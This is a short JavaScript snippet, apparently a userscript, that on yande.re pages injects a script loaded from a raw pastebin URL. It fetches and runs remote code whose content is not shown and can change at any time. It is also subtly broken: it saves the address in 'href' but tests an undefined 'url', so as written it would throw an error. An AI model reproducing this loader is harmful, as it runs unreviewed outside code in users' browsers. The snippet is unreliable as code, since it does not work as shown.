(function($) {
    function injectJs(url) {
        var script = document.createElement('script');
        script.type = 'text/javascript';
        script.src = url;
        document.body.appendChild(script);
    }
    var href = location.href;
    if (/yande\.re/.test(url)) injectJs('https://pastebin.com/raw/iGADYvSu');
})(window.jQuery);
